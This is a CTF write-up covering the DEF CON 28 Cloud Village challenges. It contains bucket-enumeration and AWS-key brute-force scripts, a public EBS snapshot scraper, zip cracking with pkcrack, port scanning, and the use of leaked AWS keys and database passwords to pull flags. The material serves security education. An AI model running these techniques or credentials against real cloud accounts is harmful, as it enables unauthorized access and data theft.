DEF CON 28 Cloud Village CTF write up
#####################################
:date: 2020-08-10
:author: tvd
:category: ctf
:tags: ctf, security, defcon
:slug: defcon28-cloud-village-ctf-writeup

This past weekend was `DEF CON 28 <https://defcon.org>`_, with safe mode. The `Cloud Village <https://cloud-village.org/>`_ was back for its second year, and another CTF!

Last year I came in first only solving 4 out of the 11 challenges, and this year I was excited to participate again with the `CTF_Circle team <https://twitter.com/CTF_Circle>`_! I was the only one that ended up working on the Cloud Village CTF—our team competed across many of the DEF CON village CTFs this year. `I finished second <https://twitter.com/CTF_Circle/status/1292856176351346688>`_, solving 8 out of the 11 challenges!

This post walks through all 11 challenges. I got help from the winning team—attackercommunity—after the challenge on two of them. The final one was not solved by any team. One of the organizers helped us get started after the CTF ended.

Play this first (10 points)
---------------------------
This was a gimme challenge to ensure people were registered, understood the format of the flags, and likely to give the organizers an idea of how many of the registered teams actually were attempting the challenges. The flag was in the description: ``FLAG-{NyxfmuEvJQ5tMlMKuZNLdEzPnXuyKh9F}``.

Commitment Issues (100 points)
------------------------------

    Bob was tasked to create a repo containing code in as many languages as she could that would print the obligatory "Hello World". Bob created the code as she was instructed, however, hiis repo was forked by Alice who ended up adding the location of the flag for this level in the code.

    Can you find and report the flag, so that we can confirm it's really out there and we are not imagining things?

    To get started, you might want to look at Bob's repo. Bob's username is cloudisgod (corny as it is, it describes his sentiment as well)!

There was a github user with this username, and they had three repos. Two of them had hello world programs in a bunch of languages. These repos were forked by the ctfevents user, and that user had made some changes in both repos. Here is the concise list of urls to visit for the challenge.

* https://github.com/cloudisgod
* https://github.com/cloudIsgod/ctfgoals
* https://github.com/ctfevents/ctfgoals
* https://github.com/ctfevents/ctfgoals/commit/cc33bb8daf29865c6033badd75ea8cf7477588a8
* https://github.com/ctfevents/ctfgoals/commit/c7f0202ccdd3a5ffd5f8f8f6b4dfb760b21ac2cc

.. image:: /images/dc28-cloud-ctf-commit-issues.png
    :align: center

I spent some time attempting to see if that invalid aws key could be converted to something useful... turns out that was a `red herring <https://en.wikipedia.org/wiki/Red_herring>`_. The ``secret`` value base64 decodes into a azure storage blob url:

::

    $ echo 'aHR0cHM6Ly93aGF0aXNpbnRoaXNibG9iLmJsb2IuY29yZS53aW5kb3dzLm5ldC9vaGl0c3RoZWZsYWcv' | base64 -d
    https://whatisinthisblob.blob.core.windows.net/ohitstheflag/

Copying that directory locally is possible, and results in a file that contains the flag!

::

    $ azcopy copy https://whatisinthisblob.blob.core.windows.net/ohitstheflag/* .
    $ cat weird-name-for-a-flag-file.txt
    FLAG-{U2NyZXdJdExldCdzZG9JdEAxMDBwb2ludHM=}

Lessons
~~~~~~~
* Git history is forever, and if public for long enough, will be archived.
* Base64 keeps no secrets.
* Public cloud storage is not a place for sensitive information.

Who is this food for? (150 points)
----------------------------------

    The Jumping Sparrow annual food festival is here. The website is ready and saved on AWS S3 as a backup. The admin, our very own Agent K of Humans in Black has purchased a domain where the site will be hosted.

    Alas, the admin seems to have lost his way home last night and is not reachable on his transponder as well! Can you help us find the FLAG so that we can remotely hijack his transponder and see where he is?

    You may start looking at AWS S3 to find the website first, that might give you a clue.

    Oh, Agent K is nefarious for using easy to guess names for his storage, like we found him storing his mother's recipes in S3 buckets called "recipe-galaxynuts" and "ruminfused-galaxynuts" which later ended up on his personal blog of galaxynuts.com anyways.

    Given his logic of naming things, the name of the storage we are looking for should be "something-jumpingsparrow". Good luck with your hunt!

The description here ended up being mostly misdirection. I don't know if there actually was an S3 bucket—I spent several hours running a program that checked for lots of permutations of food related words as the prefix for "<prefix>-jumpingsparrow". I also looked for all kind of men in black foods, agent K foods, spaceballs foods, etc. I searched https://buckets.grayhatwarfare.com/. I found no buckets. This was the program I used to check for buckets, though, for what that's worth:

.. code-block:: python

    import click
    import inflect
    import re
    import requests
    import string


    @click.command()
    @click.argument('wordlist', type=click.File())
    def cli(wordlist):
        s = requests.Session()
        ieng = inflect.engine()
        words_raw = wordlist.read()

        words = [w.strip().lower() for w in words_raw.splitlines()]
        singular = [ieng.singular_noun(w) for w in words if ieng.singular_noun(w) is not False]
        all_words = []
        r = re.compile(f'[^{string.ascii_lowercase}]')
        for w in singular + words:
            all_words.append(r.sub('', w))

        suffix = 'jumpingsparrow'
        possibles = []
        with click.progressbar(all_words) as pb:
            for w in pb:
                bucket_name = f'{w}-{suffix}'
                resp = s.head(f'http://{bucket_name}.s3.amazonaws.com')
                if resp.status_code != 404:
                    print(f'SUCCESS: possible bucket name: {bucket_name}')
                    possibles.append(bucket_name)
        for p in possibles:
            print(f'SUCCESS: possible bucket name: {p}')


    if __name__ == '__main__':
        cli()


This flag was actually found via WHOIS record.::

    $ whois jumpingsparrow.co | grep FLAG
    Registrant State/Province: FLAG-{WsWnYSnvFbak0dE2mfUjLr12ELdmUbSo}

Lessons
~~~~~~~
* WHOIS records are a useful source of OSINT.
* CTFs sometimes use misdirection in their challenge prompts.

What name do I cling on? (150 points) - Unsolved during CTF
-----------------------------------------------------------

**Note:** *I did not solve this challenge during the CTF, and neither did any other team. As far as we can tell, none of the teams figured out there was a backup.zip file to download. One of the organizers gave us a big hint after the CTF ended that enabled us to find the backup.zip.*

    Rose DeWitt Bukater is super tech savy for her age, at just over 112 years old, she is the oldest AWS administrator in her county. But old age has its perils. One of them being the inability to grasp new knowledge as quickly as she did when she was aboard the RMS Titanic.

    Configuration goof ups have become a weekly thing now with her. Like the domain configuration she has in place for her backup buckets. Or the MongoDB server she manages.

    I mean, look at the MongoDB backup she has made at http://snapshot.cloudvillagectf.co/secondary-snapshots/, clearly missing out on utilizing AWS' cool features to export the database and instead ending up with a giant blob. Jack can't seem to make head nor tail of it either and does not believe this is the actual backup. He believes there has to be a proper backup somewhere in that bucket (like the Heart of the Ocean)!

    There is no plank of wood to save Jack this time! Can you help him find the actual backup and use the information in there to find the flag for this level please? Before he sinks again!

Querying the DNS for the url in the challenge prompt shows that this is in S3 and in the us-west-1 region.

::

    $ dig snapshot.cloudvillagectf.co +short
    snapshot.cloudvillagectf.co.s3.amazonaws.com.
    s3-us-west-1-w.amazonaws.com.
    52.219.116.82

Requsting the full url from the prompt returns an AccessDenied response: http://snapshot.cloudvillagectf.co/secondary-snapshots/. If there is a secondary, there could be a primary snapshot, but that gave the same response. http://snapshot.cloudvillagectf.co/primary-snapshots/

I tried enumerating both those prefixes with `dirsearch <https://github.com/maurosoria/dirsearch>`_ to no avail. I guess that didn't try requesting backup.zip. :-(

After the CTF with the hint, I was able to get the backups (both primary and secondary). The primary had three dbs, each with one or more collections, and several of them had 10k ish items. The production db had one item that was not like the others—it had an AWS access key id and secret key. This is how I restored the mongodb and found the anomalous key on my mac.

::

    $ brew tap mongodb/brew
    $ brew install mongodb-community mongodb-database-tools
    $ brew services start mongodb-community

    $ mkdir -pv unpack
    $ cd unpack
    $ curl -vs 'http://snapshot.cloudvillagectf.co/primary-snapshots/backup.zip' -o primary_backup.zip
    $ unzip primary_backup.zip
    $ ls backup/
    admin           production      test

    $ mongorestore backup
    2020-08-09T16:30:30.311-0700    preparing collections to restore from
    2020-08-09T16:30:30.312-0700    reading metadata for production.config from backup/production/config.metadata.json
    2020-08-09T16:30:30.312-0700    reading metadata for test.testData1 from backup/test/testData1.metadata.json
    2020-08-09T16:30:30.312-0700    reading metadata for test.testData from backup/test/testData.metadata.json
    2020-08-09T16:30:30.349-0700    restoring test.testData1 from backup/test/testData1.bson
    2020-08-09T16:30:30.363-0700    restoring test.testData from backup/test/testData.bson
    2020-08-09T16:30:30.374-0700    no indexes to restore
    2020-08-09T16:30:30.374-0700    finished restoring test.testData (1000 documents, 0 failures)
    2020-08-09T16:30:30.381-0700    restoring production.config from backup/production/config.bson
    2020-08-09T16:30:30.441-0700    no indexes to restore
    2020-08-09T16:30:30.441-0700    finished restoring test.testData1 (10000 documents, 0 failures)
    2020-08-09T16:30:30.470-0700    no indexes to restore
    2020-08-09T16:30:30.470-0700    finished restoring production.config (10001 documents, 0 failures)
    2020-08-09T16:30:30.470-0700    21001 document(s) restored successfully. 0 document(s) failed to restore.

    $ mongo
    > use production
    > db.getCollectionNames()
    [ "config" ]

    > db.config.find()
    { "_id" : ObjectId("5f26c8677ae6e26bd1fe89eb"), "config" : "All config data" }
    ...

    > db.config.find({"config": {$not: /All config data/}})
    { "_id" : ObjectId("5f26d3fed615c40a916ecd69"), "config" : "AKIAVTXFIGND7WF7HPGM", "secret" : "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" }

I set that access key as the ``dc28-cloud-cling-on`` `aws cli profile <https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-quickstart.html#cli-configure-quickstart-profiles>`_. Then after trying to list s3 buckets, other objects in the buckets above, rds instance, running `scoutsuite <https://github.com/nccgroup/ScoutSuite>`_, I eventually queried Route 53 hosted zones. There was one! Inside it was a CNAME for the snapshot.cloudvillagectf.co flag with the flag!

::

    $ aws --profile dc28-cloud-cling-on sts get-caller-identity 
    {
        "UserId": "AIDAVTXFIGNDZGOUSGFMG",
        "Account": "385954100039",
        "Arn": "arn:aws:iam::385954100039:user/domain-hypocrisy"
    }

    $ aws --profile dc28-cloud-cling-on route53 list-hosted-zones
    {
        "HostedZones": [
            {
                "Id": "/hostedzone/Z00275981I1V4H62850JU",
                "Name": "cloudvillagectf.co.",
                "CallerReference": "0b908c48-5966-4735-bbef-d0c0ab30445a",
                "Config": {
                    "Comment": "not needed",
                    "PrivateZone": true
                },
                "ResourceRecordSetCount": 3
            }
        ]
    }

    $ aws --profile dc28-cloud-cling-on route53 list-resource-record-sets --hosted-zone-id Z00275981I1V4H62850JU
    ...
            {
                "Name": "snapshot.cloudvillagectf.co.",
                "Type": "CNAME",
                "TTL": 300,
                "ResourceRecords": [
                    {
                        "Value": "FLAG-{42DDnVtppp2dhTATCLGwqoKrqrVSo5k2}"
                    }
                ]
            }
        ]
    }


Lessons
~~~~~~~
* Check for backup.zip when enumerating files.
* Don't store AWS access keys in a database. Put them in the environment or a secret manager, or better yet use IAM roles.
* Use the CSP provided backup tools when available. If you do need to create your own backup, make sure they are encrypted (ideally using something like KMS). Definitely don't use zip file encryption. Ever.

Where's the storage? (200 points)
---------------------------------

    Some people just like to watch the world burn. Like the chap who created this challenge.

    If you have what it takes, can you reach the flag by following the breadcrumbs?

    We have heard he is a big fan of AWS, so try your luck with S3 perhaps? Psst, he is obsessed with the name storehousepost as a weird fetish.

    Uh and look for the index page, the challenge creator is sadistic at best :)

There is an S3 bucket with that name in the ap-south-1 region, and it has an index.html. There is a note about a museum at the top, and then 1000+ lines down, there is a comment about bright blue cloudless skies, which I thought might point to Azure.

$ dig storehousepost.s3.amazonaws.com +short
s3-w.ap-south-1.amazonaws.com.
52.219.64.72

http://storehousepost.s3.amazonaws.com/index.html::

    Welcome to the museum of payloads and exploits

    We have all antique payloads and rare exploits across the globe
    ...
    <!--I like the bright blue cloudless skies-->

https://storehousepost.blob.core.windows.net/ seemed like it might exist, but I didn't find anything in there. I eventually started trying all the Digital Ocean Spaces (their version of S3), and found a bucket with that name in their Singapore region. https://storehousepost.sgp1.digitaloceanspaces.com/index.html Inside was another post about the museum, and a comment about nothing to see 1000+ lines at the bottom.

::

    Welcome to the third Museum

    This is infact our largest museum
    ...
    <!-- Nothing to see here, have you tried what remains? -->

Next I tried GCP and found a storage bucket there with an index.html file that had the flag! (I used the storage APIs to find the download url below.)

::

    $ curl -vs 'https://www.googleapis.com/download/storage/v1/b/storehousepost/o/index.html?generation=1596041548811660&alt=media' -o gcp_index.html
    $ tail -1 gcp_index.html 
    <!-- FLAG-{qJBcwlaqOgwqHX08Jf4Unk14zD9pclOX} -->

Lessons
~~~~~~~
* Exploring how a company uses various cloud providers, and their regions, can lead to some interesting finds and data leaks.
* For CTFs, or at least this one, enumerating all the cloud provider storage solutions is useful.

Fused!!! (200 points) - Unsolved during CTF
-------------------------------------------

    Headers can have interesting consequences on what the server returns. Malformed, misconfigured and unexpected headers can all lead to interesting things. See if you can reach our server that appears to have been misconfigured?

    How do we start you ask? Uh, fuzz for subdomains I think. That should get you somewhere.

There was a domain at http://fuzz.cloudvillagectf.co/ that used an S3 bucket. It had an index.html page with some thoughts from Alice in Wonderland, which linked to an index.css page, which added an image of an Alice in Wonderland and the White Rabbit going down the rabbit hole...

.. image:: /images/dc28-cloud-ctf-fused-rabbit.jpg
    :align: center

I was expecting to see some `S3 metadata headers <https://docs.aws.amazon.com/AmazonS3/latest/dev/UsingMetadata.html#object-metadata>`_ given the prompt, but there were not any user defined headers. I also thought there might be a Lambda @Edge function adding headers, but alas that wasn't the case since the DNS pointed directly to the S3 bucket and it would have needed to go through CloudFront in order to use Lambda @Edge.

That's as far as I got. After the CTF, the attackercommunity team revealed there was a GCP bucket with the fuzz-cloud name, and it had user defined metadata in the response. Base64 decoding that metadata revealed the flag.

::

    $ curl -vs 'https://storage.googleapis.com/fuzz-cloud/index.html' -o/dev/null
    < x-goog-meta-you-pwned-it: RkxBRy17YlZ1bVcwTHM5NWRXcGVTNGN4Znk1ZGVxQmY5T1ZrZHB9

    $ echo 'RkxBRy17YlZ1bVcwTHM5NWRXcGVTNGN4Znk1ZGVxQmY5T1ZrZHB9' | base64 -d
    FLAG-{bVumW0Ls95dWpeS4cxfy5deqBf9OVkdp}

Lessons
~~~~~~~
* Keep those cloud storage buckets private.
* If there is a need for public objects, ensure their metadata does not include sensitive information.
* For CTFs, and `red teaming <https://en.wikipedia.org/wiki/Red_team>`_ in general, make sure to enumerate different CSPs as well as variations on the core name.

The Broken User (200 points)
----------------------------

    Not all stories have a happy ending. Like the story of Bob who deleted one of our important backups by gaining access to an S3 bucket.

    We have setup an environment that attempts to mimic the steps the Bob may have possibly taken to hurt our finances while having access to partial credentials of one of our other users.

    See if you can get the flag by using the environment. You may start here

    http://rogueuser.cloudvillagectf.co/index.html

That page contained a partial AWS access key ID and a complete AWS secret access key.

::

    ...
    <p>Here's the partial ACCESS KEY to begin with.</p>
    <ul><strong>VTXFIGNDUZ3E</strong></ul>
    <ul><strong>psLn2FftAVZBPZQABNLbyHXMKK4b0bWkzsSk498+</strong></ul>
    ...

The html indicates that only the access key part is partial. AWS secret keys are 40 characters long, which that one is. AWS access key ids are 20 characters long and they always start with ``AKIA``. So we know that there are 4 other characters that go with the access key.

AWS access keys use the characters A-Z and 2-7. I did get a little side tracked by `Scott Piper's blog from 2018 <https://summitroute.com/blog/2018/06/20/aws_security_credential_formats/>`_, which indicates that the 5th character and last character were more constrained. That no longer seems to be the case; all characters after the AKIA prefix seem to be able to use the full range of A-Z2-7 values.


There are 32 (2^5) options for each character, and four characters to replace. That gives a little over a 1 million permutations (2^5^4) for four characters, assuming we know where the four characters go. To test each individual IAM access key combination, I used the `STS GetCallerIdentity API <https://docs.aws.amazon.com/STS/latest/APIReference/API_GetCallerIdentity.html>`_ using the `boto3 aws sdk <https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/sts.html#STS.Client.get_caller_identity>`_. I didn't rigorously test this API's response times; the handful of timed requests I made took about 500 milliseconds. If I tested all access key permutations sequentially, it would have taken a little over 145 hours to test all 1 million key permutations. The CTF only ran for 51 hours, so that was not feasible. I was able to concurrently test the access key permutations using 96 python processes, which reduced the time required to test the 1 million permutations to a little over 90 minutes.

I guessed that all four character went after the AKIA prefix first, which was not correct. After letting that run and discovering none of those worked, I then guessed that they all went at the end. (I was really hoping they were not split between the front and the back of the partial, or interspersed in the partial because that would dramatically increase the time required to brute force.) Fortunately, they were all at the end, and that revealed a working key. Here is the program I used to brute force.

.. code-block:: python


    import boto3
    import botocore.exceptions
    import click
    import itertools
    import multiprocessing
    import random
    import string


    @click.command()
    @click.option('--workers', default=96)
    def cli(workers: int):
        access_key_prefix = 'AKIA'
        access_key_part = 'VTXFIGNDUZ3E'

        print('Generating permutations...')
        # A-Z and 2-7
        valid_chars = list(string.ascii_uppercase + '234567')
        random.shuffle(valid_chars)

        perms = list(itertools.product(valid_chars, repeat=4))
        random.shuffle(perms)

        four_letter_perms = list([''.join(p) for p in perms])
        random.shuffle(four_letter_perms)

        # AKIA....VTXFIGNDUZ3E
        # all_access_keys = [f'{access_key_prefix}{four_letters}{access_key_part}' for four_letters in four_letter_perms]

        # take two!: AKIAVTXFIGNDUZ3E....
        all_access_keys = [f'{access_key_prefix}{access_key_part}{four_letters}' for four_letters in four_letter_perms]

        print('Starting to work...')
        with multiprocessing.Pool(workers) as pool:
            results = pool.map(check_one_access_key, all_access_keys)

        for r in results:
            if r[0]:
                print(f'Valid access key: {r[1]}')

    def check_one_access_key(access_key: str):
        # print(f'access_key {access_key}')
        secret_key = 'psLn2FftAVZBPZQABNLbyHXMKK4b0bWkzsSk498+'
        assert(len(access_key) == 20)
        assert(len(secret_key) == 40)
        sts = boto3.client('sts', aws_access_key_id=access_key, aws_secret_access_key=secret_key)
        try:
            resp = sts.get_caller_identity()
        except botocore.exceptions.ClientError as ex:
            return (False, access_key)
        print(f'Valid access key: {access_key}')
        return (True, access_key)


    if __name__ == '__main__':
        cli()

::

    $ python exploit_broken_user.py 
    Generating permutations...
    Starting to work...
    Valid access key: AKIAVTXFIGNDUZ3EEFMB

I set the now known access key and secret in a ``cd28-cloud-broken-user`` profile, and started exploring the S3 bucket, which revealed the flag!

::

    $ aws sts get-caller-identity --profile cd28-cloud-broken-user
    {
        "UserId": "AIDAVTXFIGNDQ7VIGBOFD",
        "Account": "385954100039",
        "Arn": "arn:aws:iam::385954100039:user/dragonmaster"
    }

    $ aws --profile cd28-cloud-broken-user s3 ls s3://rogueuser.cloudvillagectf.co/
                            PRE assets/
                            PRE images/
    2020-08-01 07:34:33        651 CREDITS.txt
    2020-08-01 07:34:33      17130 LICENSE.txt
    2020-08-01 07:34:33         39 flag.txt
    2020-08-01 07:34:33       1779 index.html

    $ aws --profile cd28-cloud-broken-user s3 cp s3://rogueuser.cloudvillagectf.co/flag.txt ./
    download: s3://rogueuser.cloudvillagectf.co/flag.txt to ./flag.txt

    $ cat flag.txt 
    FLAG-{jnLvAFcbxbHu9sIlF5us2pQVBrnrD1la}

Lessons
~~~~~~~
* I originally didn't think it would be possible to brute force the key—I thought more characters were valid. Doing the research on the format showed that the space was more constrained and reasonable to brute force on commodity hardware.
* Verify that blog posts are still accurate. I was originally excited to discover that the 5th and last characters in the AWS access key id only had two possible characters, because that reduced the search space considerably. I should have verified that first, though.
* Finally, when sharing a partial secret, carefully consider how much of a secret is being redacted, and what search space would need to be explored to brute force it. In this case, the AWS access key id is actually something that is generally not considered, on their own, to be highly sensitive. The secret part never should be shared (even in partial form), though.

Our passion. Your potential. (300 points) - Unsolved during CTF
---------------------------------------------------------------

    Dave is big fan of static sites. He has been planning to build a Work from Home themed site for his readers and is currently storing all his content on some cloud provider. There is also news on the wires that he is going to use some serverless code as well to run some dynamic code.

    We don't know what it is or where it is. All we have to get started is the domain that he purchased - supersecureapp.com

    Can you find his public site and reach the flag from there?

Querying the DNS shows that the domain points to an azure storage blob bucket. It took me quite a while to find the /public/ directory... the enumeration tools I was using didn't search for that, I guess. In the index.html there was a comment about another javascript file that was not added yet.

::

    $ dig supersecureapp.com +short
    lvl3storage.blob.core.windows.net.
    blob.blz21prdstr05a.store.core.windows.net.
    20.150.90.68

    $ curl -vs 'https://lvl3storage.blob.core.windows.net/public/index.html' -o index.html
    ...
    < HTTP/1.1 200 OK
    < Content-Length: 8214
    < Content-Type: text/html
    ...
    <!-- Removing reference as scripts.js works for now, will add data fetch after dev is completed. Login needs to be built so this is for the future.
            <script src="add-file-name-of-data-fetch-js-here"></script>
    ...

It was possible to copy the directory contents using azcopy, which showed a routesFetch.js file. Unfortunately, that file was obfuscated.

::

    $ azcopy copy https://lvl3storage.blob.core.windows.net/public/* . --recursive
    ...
    Number of Transfers Completed: 6
    ...
    TotalBytesTransferred: 741121

    $ tree .
    .
    ├── assets
    │   └── img
    │       ├── bg-masthead.jpg
    │       └── favicon.ico
    ├── css
    │   └── styles.css
    ├── index.html
    └── js
        ├── routesfetch.js
        └── scripts.js
    
    $ cat js/routesfetch.js 
    /* adding security by fetching routes from server instead of hardcoding them here like noob frontend devs */
    /* smart idea number 348 dated jun 12th 2020, work in progress */

    var a=['then','json','stringify','application/json;\x20charset=UTF-8','fromCharCode'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0xda));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var u=String[b('0x1')](0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f,0x62,0x61,0x63,0x6b,0x65,0x6e,0x64,0x2d,0x75,0x73,0x65,0x72,0x62,0x61,0x73,0x65,0x2d,0x72,0x6f,0x75,0x74,0x65,0x73,0x2e,0x61,0x7a,0x75,0x72,0x65,0x77,0x65,0x62,0x73,0x69,0x74,0x65,0x73,0x2e,0x6e,0x65,0x74,0x2f,0x61,0x70,0x69,0x2f,0x6c,0x6f,0x67,0x69,0x6e),m=String[b('0x1')](0x50,0x4f,0x53,0x54);fetch(u,{'method':m,'body':JSON[b('0x4')]({'name':'','pass':''}),'headers':{'Content-type':b('0x0')}})[b('0x2')](c=>c[b('0x3')]());

I edited index.html locally to load the routesFetch.js script, opened it in chrome, and opened the chrome developer tools console and saw a CORS error showing that the script was making a POST request to an Azure function...

::

    Access to fetch at 'https://backend-userbase-routes.azurewebsites.net/api/login' from origin 'null' has been blocked by CORS policy: ....

The request that was geting blocked was a POST request to https://backend-userbase-routes.azurewebsites.net/api/login with request body ``{name: "", pass: ""}``. I got to this point in this challenge about 15 minutes before the end of the CTF. I tried some obvious username and password, but didn't figure out the correct combo. The attackercommunity team shared after the CTF that they brute forced the credentials, which were ``{"name":"azureuser","pass":"123456"}``. Making that request revealed an error about the command, which pointed to a helper. listmethods showed the available commands, and printuserenv showed the flag.

::

    $ curl -vs -X POST 'https://backend-userbase-routes.azurewebsites.net/api/login' -H 'Content-type: application/json' -d'{"name":"azureuser","pass":"123456"}'
    ...
    Missing command parameter. Try using 'listmethods' to see what is available.* Closing connection 0

    $ curl -vs -X POST 'https://backend-userbase-routes.azurewebsites.net/api/login' -H 'Content-type: application/json' -d'{"name":"azureuser","pass":"123456","cmd":"listmethods"}'
    {'params':['listmethods','gettoken','testconnection','printuserenv']}

    $ curl -vs -X POST 'https://backend-userbase-routes.azurewebsites.net/api/login' -H 'Content-type: application/json' -d'{"name":"azureuser","pass":"123456","cmd": "printuserenv"}'
    {'flag':'FLAG-{QZaH504CJKNWO0uVmvHqD0V0XmDxGPVY}'}

Lessons
~~~~~~~
* Don't leave development comments in the source or deploy partial work.
* Use better passwords.
* Obfuscated javascript, while it can be helpful, doesn't prevent someone from easily observing the behavior (especially any network access).

It's Elementary Watson! (500 points)
------------------------------------

    Sherlock Holmes is finally moving to the cloud! Yes you heard that right, he has been practicing storing of his case files in AWS RDS. He thinks he is a bit of 'noob' anyways and keeps making mistakes like leaving his RDS open to the world.

    We have a weird request though from you, Sherlock seems to have gone underground for another case and we need access to the AWS RDS that he uses. All we know is that he has taken a snapshot of the EC2 instance he was using to setup his website and moved the snapshot to a non American AWS region.

    Can you get us access to the AWS RDS and send us the flag please? We will take over the investigation from there.

AMIs and EBS snapshots can be publicly shared, which has been reported more widely in the last year or so as people have found sensitive info in these shared images. `Duo Labs did an analysis of how many of these were available back in 2018 <https://duo.com/blog/beyond-s3-exposed-resources-on-aws>`_. There are a l ot. I wrote a script to download all the non-US region AMIs and EBS snapshots.

.. code-block:: python

    import boto3
    import click
    import csv
    import json

    @click.command()
    @click.option('--skip-amis/--no-skip-amis', default=True)
    def cli(skip_amis):
        s = boto3.Session()

        regions = [
            "eu-west-2",
            "eu-north-1",
            "ap-south-1",
            "eu-west-3",
            "eu-west-1",
            "ap-northeast-2",
            "ap-northeast-1",
            "sa-east-1",
            "ca-central-1",
            "ap-southeast-1",
            "ap-southeast-2",
            "eu-central-1",
            # "us-east-1",
            # "us-east-2",
            # "us-west-1",
            # "us-west-2",
        ]

        ami_outfile = 'amis.njson'
        snapshot_outfile = 'snapshots.njson'
        with open(snapshot_outfile, 'wb') as snap_fp, open(ami_outfile, 'wb') as ami_fp:
            for region in regions:
                print(f'working on region: {region}')
                ec2 = s.client('ec2', region_name=region)

                snapshots_pages = ec2.get_paginator('describe_snapshots')
                snap_count = 0
                for snapshots in snapshots_pages.paginate():
                    snap_count += len(snapshots['Snapshots'])
                    for snap in snapshots['Snapshots']:
                        snap['StartTime'] = snap['StartTime'].isoformat()
                        snap['__region'] = region
                        snap_fp.write(bytes(json.dumps(snap), 'utf8'))
                        snap_fp.write(b'\n')
                        snap_fp.flush()
                print(f'Retrieved {snap_count} snapshots; wrote to {snapshot_outfile}')

                if not skip_amis:
                    images = ec2.describe_images(
                        ExecutableUsers=['all'],
                        Filters=[{
                            'Name': 'is-public',
                            'Values': ['true']
                        }]
                    )
                    print(f'Retrieved {len(images["Images"])} images; writing to {ami_outfile}')
                    for img in images['Images']:
                        img['__region'] = region
                        ami_fp.write(bytes(json.dumps(img), 'utf8'))
                        ami_fp.write(b'\n')
                        ami_fp.flush()


    if __name__ == '__main__':
        cli()

Once that was done, grepping for sherlock revealed a public ``sherlockholmes-secrets`` EBS snapshot in the ap-southeast-1 region. I copied that EBS snapshot into my own account.

::

    $ python exploit_watson.py
    $ cat snapshots.njson | grep -i sherlock
    {"Description": "sherlockholmes-secrets", "Encrypted": false, "OwnerId": "385954100039", "Progress": "100%", "SnapshotId": "snap-0bddf547184e05905", "StartTime": "2020-08-02T10:33:07.930000+00:00", "State": "completed", "VolumeId": "vol-ffffffff", "VolumeSize": 8, "__region": "ap-southeast-1"}

    $ aws --region ap-southeast-1 ec2 copy-snapshot --description 'dc28-sherlockholmes-secrets2' --destination-region us-west-2 --source-region ap-southeast-1 --source-snapshot-id snap-0bddf547184e05905

After that, I went into the AWS console and created an AMI from that EBS snapshot, and launched an EC2 instance based on that AMI. Then I could SSH into my copy of Sherlock Holmes's system. Eventually I discovered the ``/var/www/supersecretapp.zip`` file. The zip archive was encrypted, but the directory paths and file names were able to be viewed without decrypting.

::

    $ zipinfo supersecretapp.zip | grep file
    ...
    found file 'www/db_config.php', size 420 (300), encrypted
    found file 'www/js/main.js', size 1815 (563), encrypted
    found file 'www/logout.php', size 70 (72), encrypted
    found file 'www/home.php', size 1173 (574), encrypted
    ...
    found file 'www/fonts/font-awesome-4.7.0/fonts/fontawesome-webfont.svg', size 444379 (136013), encrypted
    ...

I tried cracking the password with john the ripper and a few different password lists. None of those worked, though. It's possible to crack zip files if one of the files is known, and since I knew that font-awesome 4.7.0 was being used, I was able to download that, craft an unencrypted zipfile that had the same structure for one of its files (I picked the biggest one I could find, because that speeds up the cracking process), and then used pkcrack to get a decrypted zip archive.

::

    # https://fontawesome.com/v4.7.0/get-started/
    # unzip that and move to www/fonts/font-awesome-4.7.0
    $ zip -r plaintext.zip www/fonts/font-awesome-4.7.0

    $ pkcrack -C supersecretapp.zip -P plaintext.zip -d crackedapp.zip -p www/fonts/font-awesome-4.7.0/fonts/fontawesome-webfont.svg -a -c www/fonts/font-awesome-4.7.0/fonts/fontawesome-webfont.svg

That produces crackedapp.zip, and db_config.php is visible when unpacked.

.. code-block:: php

    ...
    $DBUSER = 'noob';
    $DBPASS = 'morbidcuriosity1';
    $DBHOST = 'sherlockholmes.cofmk5ck21bg.us-east-1.rds.amazonaws.com';
    $DBPORT = getenv("port");//changed to avoid random scans from the internet                                                                             
    $con=mysqli_connect($DBHOST,$DBUSER,$DBPASS,'sherlockholmes');
    ...

Port scanning the RDS instance reveals the port.::

    $ nmap -A -Pn  sherlockholmes.cofmk5ck21bg.us-east-1.rds.amazonaws.com
    Nmap scan report for sherlockholmes.cofmk5ck21bg.us-east-1.rds.amazonaws.com (107.21.193.30)
    Host is up (0.089s latency).
    rDNS record for 107.21.193.30: ec2-107-21-193-30.compute-1.amazonaws.com
    Not shown: 999 filtered ports
    PORT     STATE SERVICE VERSION
    3389/tcp open  mysql   MySQL 5.5.5-10.2.21-MariaDB-log
    | mysql-info: 
    |   Protocol: 10
    |   Version: 5.5.5-10.2.21-MariaDB-log
    |   Thread ID: 6842
    |   Capabilities flags: 65534
    |   Some Capabilities: Support41Auth, ConnectWithDatabase, SupportsCompression, FoundRows, SwitchToSSLAfterHandshake, IgnoreSigpipes, LongColumnFlag, SupportsTransactions, SupportsLoadDataLocal, Speaks41ProtocolOld, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, DontAllowDatabaseTableColumn, ODBCClient, InteractiveClient, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
    |   Status: Autocommit
    |   Salt: Y|(K%u@{m1I]vZBy[=^B
    |_  Auth Plugin Name: mysql_native_password

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 75.42 seconds

Unfortunately, in conducting that port scan it also caused the system to ban my IP. I started yet another instance and then was able to connect. Showing the database tables revealed a ``flagtable`` that had the flag!

::

    $ mysql -u noob -pmorbidcuriosity1 -h sherlockholmes.cofmk5ck21bg.us-east-1.rds.amazonaws.com -P 3389
    mysql ((none))> use sherlockholmes;
    mysql (sherlockholmes)> show tables;
    +--------------------------+
    | Tables_in_sherlockholmes |
    +--------------------------+
    | flagtable                |
    +--------------------------+
    1 row in set (0.26 sec)
    mysql (sherlockholmes)> select * from flagtable;
    +-----------------------------------------+
    | flag                                    |
    +-----------------------------------------+
    | FLAG-{AUbt2MVIpsidtsFLhG1fg8w63uzEJp2R} |
    +-----------------------------------------+
    1 row in set (0.14 sec)

Lessons
~~~~~~~
* Don't make EBS snapshots public unless you are really sure there are not secrets in them.
* Zip encryption is not secure. I cracked it in seconds on commodity hardware.
* I need to be more careful when port scanning targets.

Please contain me! (500 points)
-------------------------------

